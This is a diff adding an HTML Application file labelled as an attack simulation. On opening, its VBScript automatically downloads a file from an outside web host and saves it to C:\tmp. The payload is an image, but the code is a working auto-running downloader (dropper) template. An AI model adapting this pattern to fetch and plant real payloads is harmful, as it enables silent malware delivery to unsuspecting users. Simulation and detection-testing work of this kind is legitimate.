@@ -1,0 +1,39 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <title>Attack Simulation HTA file</title>
+        <HTA:APPLICATION
+        APPLICATIONNAME="HTA Name"
+        ID="HTAID"
+        VERSION="1.0"
+        BORDER="none"
+        SCROLL="auto"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="maximize"
+        NAVIGABLE="yes"
+        />
+        <meta http-equiv="x-ua-compatible" content="ie=9" />
+    </head>
+    <script language="VBScript">
+
+        Sub Main()
+            dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+            dim bStrm: Set bStrm = createobject("Adodb.Stream")
+            xHttp.Open "GET", "http://hunternotes.com/wp-content/uploads/2020/06/Evil_corp.jpg", False
+            xHttp.Send
+
+            with bStrm
+                .type = 1 
+                .open
+                .write xHttp.responseBody
+                .savetofile "c:\tmp\evil.png", 2 
+            end with
+        End Sub
+
+        call Main
+
+    </script>
+    <body>
+        <p></p>
+    </body>
+</html>
